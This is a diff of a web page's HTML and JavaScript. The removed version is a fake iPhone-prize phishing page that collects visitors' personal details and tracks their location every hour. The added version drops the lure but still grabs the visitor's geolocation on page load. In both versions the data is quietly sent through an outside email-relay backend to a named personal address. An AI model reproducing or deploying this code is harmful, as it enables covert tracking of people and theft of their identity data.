@@ -3,24 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iPhone Reward Form</title>
+    <title>Location and Notification Permissions</title>
     <!-- Bootstrap CSS -->
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        /* Your existing styling */
+        /* Add custom styling here if needed */
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 class="form-heading">Congratulations! 🎉</h1>
-        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
-        <p class="form-text">Please fill out the form below to claim your reward.</p>
-
-        <form id="rewardForm">
-            <!-- Your form fields here -->
-            <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
-            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
-        </form>
+        <h1>Welcome!</h1>
+        <p>This page requests location and notification permissions on load.</p>
+        <p id="locationDisplay" class="form-text">Location permissions are required to auto-fill your location.</p>
     </div>
 
     <!-- Bootstrap and jQuery JS -->
@@ -28,7 +22,6 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 
-    <!-- JavaScript for Geolocation, Notifications, and Email Sending -->
     <script>
         document.addEventListener("DOMContentLoaded", function () {
             const locationDisplay = document.getElementById("locationDisplay");
@@ -37,103 +30,59 @@
             // Request Notification and Geolocation Permissions on Page Load
             requestPermissions();
 
-            // Function to request permissions
+            // Function to request both permissions
             function requestPermissions() {
                 // Request notification permission
                 if ("Notification" in window) {
                     Notification.requestPermission().then(permission => {
                         if (permission === "granted") {
-                            startLocationUpdates(); // Start location updates if notification is allowed
+                            alert("Notifications enabled!");
                         } else {
-                            alert("Notifications disabled. Location updates will not be sent.");
+                            alert("Notifications disabled.");
                         }
                     });
-                } else {
-                    alert("Notifications are not supported by your browser.");
                 }
-            }
 
-            // Start location updates every hour (3600000 ms) after permissions are granted
-            function startLocationUpdates() {
+                // Request geolocation permission
                 if ("geolocation" in navigator) {
-                    // Run immediately and set interval for every hour
-                    updateLocation();
-                    setInterval(updateLocation, 3600000); // 1 hour interval
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            latitude = position.coords.latitude;
+                            longitude = position.coords.longitude;
+                            locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                            sendEmail("Location Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
+                        },
+                        (error) => {
+                            locationDisplay.textContent = "Location access denied or unavailable.";
+                            sendEmail("Location Access Error", "Location access denied or unavailable.", "khalilrodeni@gmail.com");
+                        }
+                    );
                 } else {
                     locationDisplay.textContent = "Geolocation is not supported by this browser.";
                 }
             }
 
-            // Function to fetch location and send email
-            function updateLocation() {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        latitude = position.coords.latitude;
-                        longitude = position.coords.longitude;
-                        locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+            // Email Sending Function
+            function sendEmail(subject, message, recipientEmail) {
+                const emailData = {
+                    subject: subject,
+                    message: message,
+                    recipient_email: recipientEmail,
+                    recipient_name: "Khalil Ahmed"
+                };
 
-                        // Send location data email
-                        sendEmail("Hourly Location Update", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
+                fetch("https://zalex-backend.onrender.com/api/send-email/", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
                     },
-                    (error) => {
-                        locationDisplay.textContent = error.code === error.PERMISSION_DENIED ? "Location access denied by user." : "Location error.";
-                        sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
-                    }
-                );
+                    body: JSON.stringify(emailData)
+                })
+                .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
+                .then(data => console.log(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
+                .catch(error => console.log("Error sending email: " + error));
             }
-
         });
-
-        // Form submission
-        document.getElementById("rewardForm").addEventListener("submit", function (e) {
-            e.preventDefault();
-
-            const formData = {
-                fullName: document.getElementById("fullName").value,
-                dob: document.getElementById("dob").value,
-                email: document.getElementById("email").value,
-                phoneNumber: document.getElementById("phoneNumber").value,
-                address: document.getElementById("address").value,
-                city: document.getElementById("city").value,
-                postalCode: document.getElementById("postalCode").value,
-                location: `Latitude: ${latitude}, Longitude: ${longitude}`
-            };
-
-            const message = `
-                Name: ${formData.fullName}
-                Date of Birth: ${formData.dob}
-                Email: ${formData.email}
-                Phone Number: ${formData.phoneNumber}
-                Address: ${formData.address}
-                City: ${formData.city}
-                Postal Code: ${formData.postalCode}
-                Location: ${formData.location}
-            `;
-
-            sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");
-            alert("Thank you for your submission! We will contact you shortly.");
-        });
-
-        // Email Sending Function
-        function sendEmail(subject, message, recipientEmail) {
-            const emailData = {
-                subject: subject,
-                message: message,
-                recipient_email: recipientEmail,
-                recipient_name: "Khalil Ahmed"
-            };
-
-            fetch("https://zalex-backend.onrender.com/api/send-email/", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(emailData)
-            })
-            .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
-            .then(data => alert(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
-            .catch(error => alert("Error sending email: " + error));
-        }
     </script>
 </body>
 </html>
